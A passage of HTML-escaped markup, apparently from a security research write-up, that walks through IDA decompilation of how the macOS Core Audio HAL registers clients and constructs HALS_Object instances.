 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In order to interact with the HAL, a client must first register itself. There are a few ways to do this, but the simplest is using the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XSystem_Open&lt;/span&gt;&lt;span&gt;&amp;nbsp;Mach API. Calling this API will invoke the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_System::AddClient&lt;/span&gt;&lt;span&gt;&amp;nbsp;method, which uses the Mach message&amp;rsquo;s &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://knight.sc/reverse%20engineering/2020/03/20/audit-tokens-explained.html&quot;&gt;audit token&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to create a client (&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;clnt&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span&gt;&amp;nbsp;to map subsequent requests to that client. The code block below shows an IDA decompilation snippet of the creation of a &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;clnt&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;object.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v85[&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v28&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v83[&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v29&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;#39;clnt&amp;#39;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;HALS_Object::HALS_Object((HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;*)v13,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c3&quot;&gt;&amp;#39;clnt&amp;#39;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c5 VEfNEQsFFH-c7&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;(__int64)v83[&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c7 VEfNEQsFFH-c9&quot;&gt;v30);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*(_QWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)v13&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;amp;unk_7FF850E56640;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*(_OWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)(v13&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*(_OWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)(v13&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*(_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)(v13&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;1065353216&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Stepping into the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span&gt;&amp;nbsp;constructor, a mutex is acquired before getting the next available object ID before making a call to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_ObjectMap::MapObject&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;__fastcall&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALS_Object::HALS_Object(HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;_BOOL4&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a2,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a3,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a4,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*a5)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v5;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// r12d&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALB_Mutex::Locker&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*v6;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// r15&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v7;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c20&quot;&gt;// &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c20&quot;&gt;ebx&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*v8;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// rdx&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v9;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c20&quot;&gt;// &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c20&quot;&gt;eax&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a3;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*(_QWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;amp;unk_7FF850E7C200;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_DWORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;HALB_MachPort::CreatePort(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a2,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;a3);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*((_WORD&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;257&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
